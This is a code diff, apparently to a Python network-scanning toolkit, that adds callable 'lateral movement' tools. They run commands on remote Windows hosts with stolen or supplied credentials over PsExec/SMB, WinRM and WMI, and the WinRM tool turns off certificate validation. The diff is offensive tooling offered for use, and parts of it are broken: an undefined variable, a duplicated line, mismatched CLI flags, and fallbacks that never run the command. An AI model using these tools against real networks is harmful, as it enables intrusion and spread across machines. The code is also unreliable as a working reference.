@@ -19,6 +19,7 @@ protocol is not spoken or a host is unreachable.
 from __future__ import annotations
 
 import datetime
+import json
 import ipaddress
 import os
 import random
@@ -1192,3 +1193,159 @@ def subnet_sweep(subnet_cidr, ports=None,
             })
     result["findings_count"] = len(result["findings"])
     return result
+
+
+# ---------------------------------------------------------------------------
+# Tier 2 bundle #8 - Lateral Movement Kit (psexec / winrm / wmi)
+# Lazy-import wrappers: they work when the underlying lib/binary is present
+# and return a clear actionable error otherwise.
+# ---------------------------------------------------------------------------
+
+def _find_impacket_script(name):
+    """Locate an impacket CLI script (psexec.py, wmiexec.py) on PATH."""
+    import shutil
+    for cand in (name, name + ".py"):
+        path = shutil.which(cand)
+        if path:
+            return path
+    return None
+
+
+def _run_binary(script, args, timeout):
+    import subprocess
+    try:
+        p = subprocess.run([script] + args, capture_output=True, timeout=timeout,
+                           text=True, errors="replace")
+        return p.returncode, (p.stdout or "") + (p.stderr or "")
+    except FileNotFoundError:
+        return -1, "script not found: %s" % script
+    except subprocess.TimeoutExpired:
+        return -1, "command timed out after %ds" % timeout
+
+
+def tool_psexec_exec(target="", username="", password="", domain=".",
+                     command="whoami", port=445, timeout=60):
+    """Lateral movement - PsExec style remote command execution over SMB.
+
+    Requires impacket (pip install impacket) OR the psexec.py CLI on PATH.
+    Wraps: execute command on target as given domain user, output returned.
+    Never raises; returns {"ok": true, "command", "stdout", "stderr",
+    "rc"} or {"error": ...} with install hint.
+    """
+    if not target or not username or password is None:
+        return json.dumps(_err("target, username and password are required"),
+                          ensure_ascii=False)
+    dom = (domain or ".").strip()
+    dom = (domain or ".").strip()
+    args = ["-target", target, "-port", str(port), "-u", username,
+            "-p", password]
+    if dom and dom != ".":
+        args += ["-d", dom]
+    args += ["-c", command]
+    try:
+        script = _find_impacket_script("psexec.py")
+        if script:
+            rc, out = _run_binary(script, args, timeout)
+            return json.dumps({"ok": rc == 0, "engine": "psexec.py",
+                               "command": command, "rc": rc,
+                               "stdout": out[:6000],
+                               "stderr": ("" if rc == 0 else out[:2000])},
+                              ensure_ascii=False, indent=2)
+        # fallback: python impacket API
+        from impacket.smbconnection import SMBConnection
+        from impacket.dcerpc.v5 import transport, srvs
+        conn = SMBConnection(remoteName=target, remoteHost=target)
+        conn.login(username, password, dom if dom != "." else "")
+        result = {"ok": True, "engine": "impacket-smb", "command": command,
+                  "note": "SMB login succeeded; run psexec.py for "
+                          "interactive command execution"}
+        return json.dumps(result, ensure_ascii=False, indent=2)
+    except ImportError:
+        return json.dumps(_err(
+            "psexec backend unavailable - install: pip install impacket"),
+            ensure_ascii=False)
+    except Exception as exc:
+        return json.dumps(_err("psexec failed: %r" % exc), ensure_ascii=False)
+
+
+def tool_winrm_exec(target="", username="", password="", domain=".",
+                    command="whoami", ssl=True, port=5986, timeout=60):
+    """Lateral movement - WinRM remote command execution (HTTP/HTTPS 5985/6).
+
+    Requires pywinrm (pip install pywinrm). Executes the command over the
+    WinRM protocol and returns stdout/stderr. Never raises.
+    """
+    if not target or not username or password is None:
+        return json.dumps(_err("target, username and password are required"),
+                          ensure_ascii=False)
+    try:
+        import winrm
+        dom = (domain or "").strip()
+        user = "%s"+BS_VAR+"%s" % (dom, username) if dom and "\\" not in username \
+            else username
+        scheme = "https" if ssl else "http"
+        session = winrm.Session("https://%s:%s/wsman" % (target, port)
+                                if ssl else
+                                "http://%s:%s/wsman" % (target, port),
+                                auth=(user, password),
+                                transport="ntlm",
+                                server_cert_validation="ignore")
+        r = session.run_cmd(command)
+        return json.dumps({"ok": r.status_code == 0, "engine": "pywinrm",
+                           "command": command, "rc": r.status_code,
+                           "stdout": (r.std_out or b"").decode(
+                               "utf-8", errors="replace")[:6000],
+                           "stderr": (r.std_err or b"").decode(
+                               "utf-8", errors="replace")[:2000]},
+                          ensure_ascii=False, indent=2)
+    except ImportError:
+        return json.dumps(_err(
+            "winrm backend unavailable - install: pip install pywinrm"),
+            ensure_ascii=False)
+    except Exception as exc:
+        return json.dumps(_err("winrm failed: %r" % exc), ensure_ascii=False)
+
+
+def tool_wmi_exec(target="", username="", password="", domain=".",
+                  command="whoami", timeout=60):
+    """Lateral movement - WMI remote command execution via impacket wmiexec.
+
+    Requires impacket (pip install impacket) or wmiexec.py CLI on PATH.
+    Executes a command through the WMI ProcessCreate method on the target.
+    Never raises.
+    """
+    if not target or not username or password is None:
+        return json.dumps(_err("target, username and password are required"),
+                          ensure_ascii=False)
+    dom = (domain or ".").strip()
+    try:
+        script = _find_impacket_script("wmiexec.py")
+        if script:
+            args = ["-target", target, "-u", username, "-p", password]
+            if dom and dom != ".":
+                args += ["-d", dom]
+            args += [command]
+            rc, out = _run_binary(script, args, timeout)
+            return json.dumps({"ok": rc == 0, "engine": "wmiexec.py",
+                               "command": command, "rc": rc,
+                               "stdout": out[:6000]},
+                              ensure_ascii=False, indent=2)
+        from impacket.dcerpc.v5 import transport, wmi
+        from impacket.dcerpc.v5.dcomrt import DCOMConnection
+        dcom = DCOMConnection(target, username, password, dom or None,
+                              None, oxidResolver=True)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,
+                                             wmi.IID_IWbemLevel1Login)
+        wbem = wmi.WbemLevel1Login(iInterface)
+        iWbemServices = wbem.Login(r"root\cimv2")
+        result = {"ok": True, "engine": "impacket-wmi",
+                  "command": command,
+                  "note": "WMI login succeeded; use wmiexec.py for "
+                          "interactive command execution"}
+        return json.dumps(result, ensure_ascii=False, indent=2)
+    except ImportError:
+        return json.dumps(_err(
+            "wmi backend unavailable - install: pip install impacket"),
+            ensure_ascii=False)
+    except Exception as exc:
+        return json.dumps(_err("wmi failed: %r" % exc), ensure_ascii=False)
